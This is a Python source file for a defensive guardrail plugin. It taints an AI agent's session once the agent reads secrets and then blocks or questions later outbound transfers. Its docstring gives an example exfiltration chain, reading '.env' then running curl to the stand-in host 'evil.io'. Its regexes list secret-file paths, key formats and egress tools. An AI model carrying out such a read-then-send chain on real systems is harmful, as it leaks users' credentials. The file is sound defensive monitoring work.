"""Cross-call dataflow taint — catch the read-secret → … → send-out chain.

A single tool call looks benign; the danger is the SEQUENCE: `read .env` then `curl -d @data evil.io`
are two innocuous steps that together are exfiltration. Runtime guardrails that judge calls in
isolation miss this (Invariant Labs make exactly this point); AgentTrust's RiskChain tracks it. This
plugin does deterministic taint propagation across calls, persisted in the session store (so it works
even though the hook is stateless per call):

  * observe(): a read that touches a secret (`.env`, `id_rsa`, `credentials`, `*.pem`, cloud creds) —
    or a tool output that contains secret-shaped data — marks the session TAINTED and records markers.
  * pre_check(): an egress step (send/post/upload/push/curl to an external, non-user destination)
    while the session is tainted → the exfil chain. DENY when the sink is external; ASK otherwise.

`allow_hosts`/`allow_email_domains` from the grant already bound *where* data can go; this bounds
*what* leaves after a secret was seen, closing the multi-step gap.
"""

from __future__ import annotations

import json
import re

from ddbt.plugins.base import Plugin, PluginContext, PreVerdict

_READ_TOOLS = re.compile(r"read|cat|get|fetch|open|load|grep|glob|ls|list", re.I)
_EGRESS = re.compile(r"send|email|mail|post|put|upload|push|publish|share|export|curl|wget|"
                     r"webhook|sync|transfer|sftp|scp|pay|wire", re.I)
_SECRET_PATH = re.compile(r"\.env\b|id_rsa|/\.ssh/|/\.aws/|credential|secret|\.pem\b|private[_-]?key", re.I)
_SECRET_VALUE = re.compile(r"BEGIN [A-Z ]*PRIVATE KEY|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{20,}|"
                           r"xox[baprs]-[A-Za-z0-9-]+|password\s*[=:]|api[_-]?key\s*[=:]", re.I)
_EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})")
_URL = re.compile(r"https?://([^/\s:'\"]+)")
_KEY = "dataflow_taint"


def _flatten(obj) -> str:
    if isinstance(obj, str):
        return obj
    if isinstance(obj, dict):
        return " ".join(_flatten(v) for v in obj.values())
    if isinstance(obj, (list, tuple)):
        return " ".join(_flatten(v) for v in obj)
    return str(obj)


class DataflowTaint(Plugin):
    name = "dataflow_taint"

    def __init__(self, trusted_domains: tuple[str, ...] = ()):
        self.trusted = tuple(d.lower() for d in trusted_domains)

    # ---- state helpers (persisted per session) ----
    def _load(self, ctx: PluginContext) -> dict:
        if ctx.store is None:
            return {"tainted": False, "markers": []}
        raw = ctx.store.get_meta(_KEY)
        try:
            return json.loads(raw) if raw else {"tainted": False, "markers": []}
        except (ValueError, TypeError):
            return {"tainted": False, "markers": []}

    def _save(self, ctx: PluginContext, state: dict) -> None:
        if ctx.store is not None:
            ctx.store.set_meta(_KEY, json.dumps(state)[:4000])

    # ---- hooks ----
    def observe(self, tool: str, args: dict, result, ctx: PluginContext) -> None:
        blob = f"{_flatten(args)} {_flatten(result)}"
        touched_secret = bool(_SECRET_PATH.search(blob) or _SECRET_VALUE.search(blob))
        reads = bool(_READ_TOOLS.search(tool))
        if touched_secret and (reads or _SECRET_VALUE.search(_flatten(result))):
            st = self._load(ctx)
            st["tainted"] = True
            # record short markers (secret file names) so a later egress carrying them is a strong hit
            for m in re.findall(r"[\w./-]*(?:\.env|id_rsa|credentials|\.pem)[\w./-]*", blob, re.I):
                if m not in st["markers"]:
                    st["markers"].append(m)
            st["markers"] = st["markers"][-12:]
            self._save(ctx, st)

    def pre_check(self, tool: str, args: dict, ctx: PluginContext) -> PreVerdict | None:
        text = _flatten(args)
        dests = _EMAIL.findall(text) + _URL.findall(text)
        is_egress = bool(_EGRESS.search(tool) or _EGRESS.search(text) or dests)
        if not is_egress:
            return None
        st = self._load(ctx)
        if not st.get("tainted"):
            return None
        external = any(not any(d.endswith(t) for t in self.trusted) for d in dests) if dests else True
        carries_marker = any(m and m in text for m in st.get("markers", []))
        why = ("a secret was read earlier this session and this step sends data to an external "
               "destination" + (" — carrying the secret file" if carries_marker else "")
               + " (dataflow exfil chain)")
        if external or carries_marker:
            return PreVerdict("deny", why, self.name)
        return PreVerdict("ask", "a secret was read earlier; this step sends data out — confirm it's intended",
                          self.name)
